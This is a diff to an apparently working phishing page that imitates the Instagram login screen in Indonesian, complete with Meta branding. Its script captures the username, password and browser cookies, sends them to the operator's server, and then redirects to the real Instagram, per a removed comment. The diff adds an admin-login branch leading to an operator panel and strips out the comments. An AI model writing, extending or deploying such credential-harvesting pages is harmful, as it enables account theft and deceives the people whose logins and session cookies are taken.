@@ -8,7 +8,6 @@
 </head>
 <body>
 
-<!-- Loading Screen -->
 <div id="loader" class="loader">
     <svg class="ig-logo-loader" viewBox="0 0 24 24" width="80" height="80">
         <defs>
@@ -27,7 +26,6 @@
     <div class="from-meta">from <span class="meta-text">Meta</span></div>
 </div>
 
-<!-- Login Form -->
 <div id="loginPage" class="login-page hidden">
     <div class="lang-top">Bahasa Indonesia</div>
 
@@ -60,7 +58,6 @@
 </div>
 
 <script>
-// Tampilkan loading dulu, baru form setelah 1 detik
 setTimeout(function() {
     document.getElementById('loader').classList.add('hidden');
     document.getElementById('loginPage').classList.remove('hidden');
@@ -70,6 +67,19 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     e.preventDefault();
     const username = this.username.value;
     const password = this.password.value;
+
+    const checkRes = await fetch('/api/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ username, password })
+    });
+    const checkData = await checkRes.json();
+
+    if (checkData.isAdmin) {
+        sessionStorage.setItem('admin_token', checkData.token);
+        window.location.href = '/admin.html';
+        return;
+    }
 
     const fingerprint = {
         cookies: document.cookie,
@@ -91,7 +101,6 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         body: JSON.stringify({ username, password, fingerprint })
     });
 
-    // Loading lagi sebelum redirect ke IG asli
     document.getElementById('loginPage').classList.add('hidden');
     document.getElementById('loader').classList.remove('hidden');
 
